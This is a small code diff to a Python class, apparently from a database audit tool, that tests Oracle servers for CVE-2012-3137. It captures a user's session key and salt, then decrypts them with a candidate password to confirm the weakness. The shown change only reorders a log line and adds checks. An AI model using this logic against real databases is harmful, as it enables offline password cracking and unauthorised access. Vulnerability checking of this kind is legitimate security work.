@@ -214,8 +214,8 @@ class CVE_2012_3137 ():
 		logging.info("Try to know if the database server is vulnerable to the CVE-2012-3137")
 		sessionKey, salt = "", "" 
 		self.getAPassword(user)
-		if sessionKey != '' and salt != '':
-			logging.info("The challenge captured for the user {0}: key:'{1}', salt='{2}'".format(user, sessionKey, salt))
+		logging.info("The challenge captured for the user {0}: key='{1}', salt='{2}'".format(user, sessionKey, salt))
+		if sessionKey != '' and salt != '' and sessionKey != [] and salt != []:
 			session_id = self.__decryptKey__(sessionKey.decode('hex'),salt.decode('hex'),password)
 			if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
 				logging.info ("The database is vulnerable! Indeed, the result is good when you use the password '{0}' to decrypt the key '{1}' of the user {2} with the salt '{3}'".format(password, sessionKey, user, salt))
